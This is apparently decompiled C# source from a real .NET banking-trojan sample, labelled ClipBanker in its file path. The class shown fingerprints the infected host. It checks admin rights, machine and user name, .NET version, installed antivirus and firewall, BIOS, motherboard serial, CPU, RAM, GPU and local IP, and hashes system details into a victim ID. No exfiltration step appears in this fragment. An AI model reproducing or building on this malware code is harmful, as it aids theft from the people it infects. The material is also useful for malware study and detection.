// Decompiled with JetBrains decompiler
// Type: 15d.6D4
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00315d;
using \u0031xm;
using \u0035J5;
using crD;
using Me6;
using Microsoft.Win32;
using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace \u00315d
{
  internal static class \u0036D4
  {
    private static string j9c;

    [SpecialName]
    public static string \u00315e() => \u0036D4.j9c;

    [SpecialName]
    private static void cJ7([In] string obj0) => \u0036D4.j9c = obj0;

    static \u0036D4() => \u0036D4.cJ7(aw8.\u00311f(Environment.OSVersion.VersionString + Environment.SystemDirectory + Environment.SpecialFolder.UserProfile.ToString() + Environment.ProcessorCount.ToString() + new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize.ToString()));

    public static bool bSG()
    {
      try
      {
        if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
          return true;
      }
      catch
      {
      }
      return false;
    }

    public static string WGC()
    {
      try
      {
        return Environment.MachineName;
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string t7B()
    {
      try
      {
        using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
        {
          if (registryKey == null || registryKey.GetValue("Release") == null)
            return ".NET Framework Version 4.X is not detected.";
          if ((int) registryKey.GetValue("Release") >= 528040)
            return "4.8+";
          if ((int) registryKey.GetValue("Release") >= 461808)
            return "4.7.2";
          if ((int) registryKey.GetValue("Release") >= 461308)
            return "4.7.1";
          if ((int) registryKey.GetValue("Release") >= 460798)
            return "4.7";
          if ((int) registryKey.GetValue("Release") >= 394802)
            return "4.6.2";
          if ((int) registryKey.GetValue("Release") >= 394254)
            return "4.6.1";
          if ((int) registryKey.GetValue("Release") >= 393295)
            return "4.6";
          if ((int) registryKey.GetValue("Release") >= 379893)
            return "4.5.2";
          if ((int) registryKey.GetValue("Release") >= 378675)
            return "4.5.1";
          if ((int) registryKey.GetValue("Release") >= 378389)
            return "4.5";
        }
      }
      catch
      {
      }
      return ".NET Framework Version 4.X is not detected.";
    }

    public static string k4d() => Environment.UserName;

    public static string \u0039C1()
    {
      try
      {
        if (Ej4.Ev6)
          return "Disabled";
        string empty = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(L25.qyj() ? "root\\SecurityCenter2" : "root\\SecurityCenter", "SELECT * FROM AntivirusProduct"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              empty = enumerator.Current["displayName"].ToString();
          }
        }
        return !string.IsNullOrEmpty(empty) ? empty : "N/A";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string b7f()
    {
      try
      {
        if (Ej4.Ev6)
          return "Disabled";
        string empty = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(L25.qyj() ? "root\\SecurityCenter2" : "root\\SecurityCenter", "SELECT * FROM FirewallProduct"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              empty = enumerator.Current["displayName"].ToString();
          }
        }
        return !string.IsNullOrEmpty(empty) ? empty : "N/A";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string H98()
    {
      try
      {
        if (Ej4.Ev6)
          return "Disabled";
        string empty = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              empty = enumerator.Current["Manufacturer"].ToString();
          }
        }
        return !string.IsNullOrEmpty(empty) ? empty : "N/A";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string Emi()
    {
      try
      {
        if (Ej4.Ev6)
          return "Disabled";
        string str = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
            {
              ManagementObject current = (ManagementObject) enumerator.Current;
              str = current["Manufacturer"].ToString() + current["SerialNumber"].ToString();
            }
          }
        }
        return !string.IsNullOrEmpty(str) ? str : "N/A";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string IJ3()
    {
      try
      {
        if (Ej4.Ev6)
          return "Disabled";
        string empty = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              empty = enumerator.Current["Name"].ToString();
          }
        }
        return !string.IsNullOrEmpty(empty) ? empty : "N/A";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string \u0032tO()
    {
      try
      {
        if (Ej4.Ev6)
          return "Disabled";
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              return xY7.\u003812(Convert.ToDouble(enumerator.Current["TotalPhysicalMemory"]));
          }
        }
        return "Unknown";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string JTu()
    {
      try
      {
        if (Ej4.Ev6)
          return "Disabled";
        string str = string.Empty;
        using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}"))
        {
          foreach (string subKeyName in registryKey.GetSubKeyNames())
          {
            try
            {
              object obj1 = registryKey.OpenSubKey(subKeyName).GetValue("HardwareInformation.AdapterString");
              if (obj1 is byte[])
                obj1 = registryKey.OpenSubKey(subKeyName).GetValue("HardwareInformation.DriverDesc");
              object obj2 = registryKey.OpenSubKey(subKeyName).GetValue("HardwareInformation.qwMemorySize");
              if (obj1 != null && obj2 != null)
              {
                str = obj1.ToString() + " - " + xY7.c36((long) obj2);
                break;
              }
            }
            catch
            {
            }
          }
        }
        if (string.IsNullOrEmpty(str))
        {
          using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
          {
            using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
            {
              if (enumerator.MoveNext())
              {
                ManagementObject current = (ManagementObject) enumerator.Current;
                str = current["Name"].ToString() + " - " + xY7.c36((long) Convert.ToUInt32(current["AdapterRAM"]));
              }
            }
          }
        }
        return !string.IsNullOrEmpty(str) ? str : "N/A";
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string IP8()
    {
      try
      {
        if (Ej4.Ev6)
          return "Disabled";
        foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
        {
          if (networkInterface.GetIPProperties().GatewayAddresses.FirstOrDefault<GatewayIPAddressInformation>() != null && (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up))
          {
            foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
            {
              if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != (long) uint.MaxValue)
                return unicastAddress.Address.ToString();
            }
          }
        }
      }
      catch
      {
      }
      return "Unknown";
    }
  }
}
